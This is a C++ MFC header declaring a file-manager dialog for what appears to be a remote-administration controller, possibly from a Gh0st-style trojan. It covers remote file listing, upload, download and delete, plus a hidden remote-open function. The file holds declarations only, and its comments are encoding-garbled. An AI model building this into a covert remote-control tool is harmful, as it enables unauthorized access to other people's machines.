#if !defined(AFX_FILEMANAGERDLG_H__4918F922_13A4_4389_8027_5D4993A6DB91__INCLUDED_)
#define AFX_FILEMANAGERDLG_H__4918F922_13A4_4389_8027_5D4993A6DB91__INCLUDED_
#include "TrueColorToolBar.h"	// Added by ClassView
#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "IOCPServer.h"
#include "SortListCtrl.h"

#define CIOCPServer IOCPServer

#define ClientContext CONTEXT_OBJECT

typedef struct
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;

#define m_DeCompressionBuffer InDeCompressedBuffer

#define GetBufferLen GetBufferLength

#define m_Dialog hDlg

#define m_Socket sClientSocket

#define MAKEINT64(low, high) ((unsigned __int64)(((DWORD)(low)) | ((unsigned __int64)((DWORD)(high))) << 32))

#define	MAX_WRITE_RETRY			15 // ����д���ļ�����
#define	MAX_SEND_BUFFER			1024 * 8 // ��������ݳ���
#define MAX_RECV_BUFFER			1024 * 8 // ���������ݳ���

#define WM_MY_MESSAGE (WM_USER+300)

// FileManagerDlg.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CFileManagerDlg dialog
typedef CList<CString, CString&> strList;

class CFileManagerDlg : public DialogBase
{
protected:
	// ����״̬����Ϣ
	afx_msg LRESULT OnMyMessage(WPARAM wParam, LPARAM lParam)
	{
		char *buff = (char*)lParam;
		m_wndStatusBar.SetPaneText(0, buff);
		delete[]buff;
		return S_OK;
	} 

// Construction
public:
	bool m_bIsStop;
	CString m_strReceiveLocalFile;
	CString m_strUploadRemoteFile;
	void ShowProgress();
	void SendStop();
	int m_nTransferMode;
	CString m_hCopyDestFolder;
	void SendContinue();
	void SendException();
	void EndLocalRecvFile();
	void EndRemoteDeleteFile();
	CString m_strOperatingFile; // �ļ���
	__int64 m_nOperatingFileLength; // �ļ��ܴ�С
	__int64	m_nCounter;// ������
	void WriteLocalRecvFile();
	void CreateLocalRecvFile();
	BOOL SendDownloadJob();
	BOOL SendUploadJob();
	BOOL SendDeleteJob();
	void UpdateWindowsPos();

	strList m_Remote_Download_Job;
	strList m_Remote_Upload_Job;
	strList m_Remote_Delete_Job;
	CTrueColorToolBar m_wndToolBar_Local;
	CTrueColorToolBar m_wndToolBar_Remote;
	void ShowMessage(char *lpFmt, ...);
	CString m_Remote_Path;
	BYTE m_bRemoteDriveList[1024];
	CString GetParentDirectory(CString strPath);
	void OnReceiveComplete();

	CImageList* m_pImageList_Large;
	CImageList* m_pImageList_Small;

	int m_nNewIconBaseIndex; // �¼ӵ�ICON

	CProgressCtrl* m_ProgressCtrl;
	HCURSOR m_hCursor;
	CString m_Local_Path;
	bool FixedUploadDirectory(LPCTSTR lpPathName);
	void FixedLocalDriveList();
	void FixedRemoteDriveList();
	void FixedLocalFileList(CString directory = "");
	void GetRemoteFileList(CString directory = "");
	void FixedRemoteFileList(BYTE *pbBuffer, DWORD dwBufferLen);

	CStatusBar m_wndStatusBar;
	CFileManagerDlg(CWnd* pParent = NULL, Server* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor

	~CFileManagerDlg()
	{
		if(m_ProgressCtrl) delete m_ProgressCtrl;
	}
// Dialog Data
	//{{AFX_DATA(CFileManagerDlg)
	enum { IDD = IDD_FILE };
	CComboBox	m_Remote_Directory_ComboBox;
	CComboBox	m_Local_Directory_ComboBox;
	CSortListCtrl	m_list_remote;
	CSortListCtrl	m_list_local;
	//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CFileManagerDlg)
	public:
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	virtual void PostNcDestroy();
	//}}AFX_VIRTUAL

// Implementation
protected:

	// Generated message map functions
	//{{AFX_MSG(CFileManagerDlg)
	virtual BOOL OnInitDialog();
	afx_msg HCURSOR OnQueryDragIcon();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnDblclkListLocal(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnBegindragListLocal(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnBegindragListRemote(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg	BOOL OnToolTipNotify(UINT id, NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnMouseMove(UINT nFlags, CPoint point);
	afx_msg void OnLButtonUp(UINT nFlags, CPoint point);
	afx_msg void OnTimer(UINT_PTR nIDEvent);
	afx_msg void OnClose();
	afx_msg void OnDblclkListRemote(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnLocalPrev();
	afx_msg void OnRemotePrev();
	afx_msg void OnLocalView();
	afx_msg void OnLocalList();
	afx_msg void OnLocalReport();
	afx_msg void OnLocalBigicon();
	afx_msg void OnLocalSmallicon();
	afx_msg void OnRemoteBigicon();
	afx_msg void OnRemoteList();
	afx_msg void OnRemoteReport();
	afx_msg void OnRemoteSmallicon();
	afx_msg void OnRemoteView();
	afx_msg void OnUpdateLocalStop(CCmdUI* pCmdUI);
	afx_msg void OnUpdateRemoteStop(CCmdUI* pCmdUI);
	afx_msg void OnUpdateLocalPrev(CCmdUI* pCmdUI);
	afx_msg void OnUpdateRemotePrev(CCmdUI* pCmdUI);
	afx_msg void OnUpdateLocalCopy(CCmdUI* pCmdUI);
	afx_msg void OnUpdateRemoteCopy(CCmdUI* pCmdUI);
	afx_msg void OnUpdateRemoteDelete(CCmdUI* pCmdUI);
	afx_msg void OnUpdateRemoteNewfolder(CCmdUI* pCmdUI);
	afx_msg void OnUpdateLocalDelete(CCmdUI* pCmdUI);
	afx_msg void OnUpdateLocalNewfolder(CCmdUI* pCmdUI);
	afx_msg void OnRemoteCopy();
	afx_msg void OnLocalCopy();
	afx_msg void OnLocalDelete();
	afx_msg void OnRemoteDelete();
	afx_msg void OnRemoteStop();
	afx_msg void OnLocalStop();
	afx_msg void OnLocalNewfolder();
	afx_msg void OnRemoteNewfolder();
	afx_msg void OnTransfer();
	afx_msg void OnRename();
	afx_msg void OnEndlabeleditListLocal(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnEndlabeleditListRemote(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnDelete();
	afx_msg void OnNewfolder();
	afx_msg void OnRefresh();
	afx_msg void OnLocalOpen();
	afx_msg void OnRemoteOpenShow();
	afx_msg void OnRemoteOpenHide();
	afx_msg void OnRclickListLocal(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnRclickListRemote(NMHDR* pNMHDR, LRESULT* pResult);
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()

protected:
	CListCtrl* m_pDragList;		//Which ListCtrl we are dragging FROM
	CListCtrl* m_pDropList;		//Which ListCtrl we are dropping ON
	BOOL		m_bDragging;	//T during a drag operation
	int			m_nDragIndex;	//Index of selected item in the List we are dragging FROM
	int			m_nDropIndex;	//Index at which to drop item in the List we are dropping ON
	CWnd*		m_pDropWnd;		//Pointer to window we are dropping on (will be cast to CListCtrl* type)

	void DropItemOnList(CListCtrl* pDragList, CListCtrl* pDropList);
private:
	bool m_bIsUpload; // �Ƿ��ǰѱ�����������Զ���ϣ���־����λ
	bool MakeSureDirectoryPathExists(LPCTSTR pszDirPath);
	void SendTransferMode();
	void SendFileData();
	void EndLocalUploadFile();
	bool DeleteDirectory(LPCTSTR lpszDirectory);
	void EnableControl(BOOL bEnable = TRUE);
	float m_fScalingFactor;
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_FILEMANAGERDLG_H__4918F922_13A4_4389_8027_5D4993A6DB91__INCLUDED_)
